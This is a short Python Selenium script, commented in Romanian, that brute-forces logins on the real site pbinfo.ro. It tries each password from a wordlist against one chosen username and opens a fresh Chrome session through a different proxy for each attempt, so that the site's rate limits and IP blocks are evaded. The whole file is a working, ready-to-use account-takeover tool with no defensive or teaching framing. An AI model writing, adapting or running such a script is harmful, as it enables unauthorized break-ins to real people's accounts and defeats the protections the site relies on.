from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
import time


PATH = "C:\Program Files (x86)\chromedriver.exe" # 

driver = webdriver.Chrome(PATH)
username = "pbinfouser" # pune numele userului aici


with open("pbinfopasswords.txt") as pbinfopasswords, open("proxies.txt") as proxyLines: # puneti fisierul cu proxies in proxies.txt, puneti fisierul  cu parole in pbinfopasswords.txt;
 for line , proxyline in zip(pbinfopasswords, proxyLines):
  line  = line.strip()
  proxyline = proxyline.strip()
  chrome_options = webdriver.ChromeOptions()
  ipandport = proxyline.split(":")
  ip = ipandport[0]
  port = ipandport[1]
  chrome_options.add_argument(f'--proxy-server={ip}:{port}')
  driver = webdriver.Chrome(PATH, options=chrome_options)
  driver.get("https://www.pbinfo.ro/")
  time.sleep(10)
  driver.find_element(By.CSS_SELECTOR,"#navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(1) > a").click()
  time.sleep(1)
  driver.find_element(By.ID,"user_login").send_keys(username)
  driver.find_element(By.CSS_SELECTOR,"#parola_login").send_keys(line.strip())
  driver.find_element(By.CSS_SELECTOR,"#form-login-modal > div.modal-footer > div:nth-child(1) > div > button.btn.btn-primary").click()
  time.sleep(4)



